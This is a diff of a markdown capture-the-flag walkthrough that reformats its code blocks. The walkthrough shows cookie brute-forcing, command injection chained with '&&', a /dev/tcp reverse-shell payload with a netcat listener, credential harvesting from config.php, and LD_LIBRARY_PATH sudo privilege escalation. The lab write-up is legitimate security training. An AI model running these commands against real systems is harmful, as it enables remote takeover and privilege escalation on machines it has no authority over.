@@ -90,7 +90,9 @@ hijackuser:x:1003:1003::/home/hijackuser:/bin/sh
 
 with these steps complete, we can now switch users into the `hijackuser` account.
 
-``` su hijackuser ```
+```
+su hijackuser 
+```
 
 now we can access the mounted share directory 
 
@@ -118,7 +120,9 @@ get .passwords_list.txt
 
 successfully gotten these files on our local machine, we go ahead to view them
 
-``` cat .from_admin.txt ```
+```
+ cat .from_admin.txt 
+```
 
 ![Alt text](11.png)
 
@@ -137,7 +141,9 @@ we can attempt to capture the request so we can see what happens behind the scen
 
 Fortunately, the PHPSESSID follows a straightforward structure. It begins by prefixing the username and appending the MD5 hash of your password. Finally, the entire string is encoded using base64.
 
-```base64.encode(username:md5sum(user password))```
+```
+base64.encode(username:md5sum(user password))
+```
 
 
 since we have a password list, we can  attempt to brute force the Cookie PHPSESSID using burp suite.
@@ -173,11 +179,15 @@ the page allows us to view the status of running services on the server. you can
 
 we can bypass this by using a `&&` sign after our original command and then passing in our arbitrary command to be executed.
 
-```ssh.service && bash -c "bash -i >& /dev/tcp/10.9.215.120/4455 0>&1"```
+```
+ssh.service && bash -c "bash -i >& /dev/tcp/10.9.215.120/4455 0>&1"
+```
 
 next we setup a listener on our attack machine using netcat
 
-``` nc -lnvp 4455 ```
+```
+nc -lnvp 4455
+```
 
 we successfully get a shell once the command gets executed
 
@@ -189,7 +199,9 @@ listing  the current directory, we can see the config file.
 
 now it's always good practice when doing a box or pentest to check for config files since they might contain username and password which may help in priv-esc.
 
-```cat config.php``` 
+```
+cat config.php
+``` 
 
 ![Alt text](21.png)
 
@@ -197,7 +209,9 @@ upon viewing the file, we have found the credentials for a user called rick.
 
 let's attempt to login as the rick user
 
-``` su rick```
+```
+su rick
+```
 
 now we have logged in as rick we can get the user flag
 
@@ -208,7 +222,9 @@ now we have logged in as rick we can get the user flag
 
 let's check what command our user is allowed to run using the following command:
 
-```sudo -l```
+```
+sudo -l
+```
 
 Based on these sudo permissions, it's evident that sudo retains a particular environment variable named "env_keep," which maintains the value of LD_LIBRARY_PATH. This presents an opportunity for privilege escalation.
 
@@ -237,9 +253,13 @@ we can then transfer the script over to our target system by starting up a simpl
 
 with the script now on the target machine, let's go ahead and compile it 
 
-```gcc -o /tmp/libcrypt.so.1 -shared -fPIC exploit.c```
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC exploit.c
+```
 
-```sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2```
+```
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
 
 ![Alt text](26.png)
 
